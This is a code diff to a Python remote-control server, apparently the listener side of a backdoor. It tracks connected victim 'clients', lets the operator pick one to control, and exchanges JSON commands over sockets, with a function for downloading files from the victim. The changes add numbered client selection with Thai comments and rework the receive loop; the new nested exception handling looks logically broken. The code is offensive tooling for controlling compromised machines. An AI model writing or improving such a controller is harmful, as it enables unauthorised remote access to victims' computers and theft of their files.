@@ -84,19 +84,31 @@ class Allclients:
 
     def list_clients(self):
         print("\n=== Connected Clients ===")
-        for client_id, details in self.client_details.items():
-            active = " *" if client_id == self.active_client else ""
-            print(f"{client_id}{active}:")
-            for key, value in details.items():
-                print(f"  {key}: {value}")
+        for i, (client_id, details) in enumerate(self.client_details.items(), 1):
+            active = "*" if client_id == self.active_client else " "
+            print(f"[{i}]{active} {client_id}")
         print("======================")
 
-    def select_client(self, client_id: str):
-        if client_id in self.clients:
-            self.active_client = client_id
-            print(f"[+] Now controlling BD in client: {client_id}")
-        else:
-            print(f"[-] Client {client_id} not found.")
+    def select_client(self, selection: str):
+        try:
+            # เลือกเป็นตัวเลข
+            if selection.isdigit():
+                idx = int(selection) - 1
+                client_ids = list(self.clients.keys())
+                if 0 <= idx < len(client_ids):
+                    client_id = client_ids[idx]
+                    self.active_client = client_id
+                    print(f"[+] Now controlling client: {client_id}")
+                    return
+            # เลือแบบเป็น client_id
+            elif selection in self.clients:
+                self.active_client = selection
+                print(f"[+] Now controlling client: {selection}")
+                return
+                
+            print("[-] Invalid client selection")
+        except Exception as e:
+            print(f"[-] Selection error: {str(e)}")
 
 
     def connect_send(self, connection: socket.socket, data: any):
@@ -116,11 +128,12 @@ class Allclients:
                 if not part_packets:
                     break
                 json_data += part_packets
-                return json.loads(json_data)
-            except socket.timeout:
-                raise Exception("Connection timed out.")
-            except ValueError:
-                continue
+                try:
+                    return json.loads(json_data)
+                except socket.timeout:
+                    raise Exception("Connection timed out.")
+                except ValueError:
+                    continue
             except Exception as e:
                 raise Exception(f"Receive error: {str(e)}")
             
@@ -138,7 +151,7 @@ class Allclients:
                 print(f"[-] Connection error: {str(e)}")    
 
 
-    def download_file_from_client(self, file_path, content):
+    def download_file_from_client(self, file_path):
         if not self.active_client:
             return "[-] No active client selected"
         try:
@@ -320,5 +333,5 @@ Available Commands:
         print("\n[+] Server shutdown completed")
 
 if __name__ == "__main__":
-    server = Allclients("192.168.1.135", 5555)
+    server = Allclients("192.168.1.101", 5555)
     server.run_cmd()
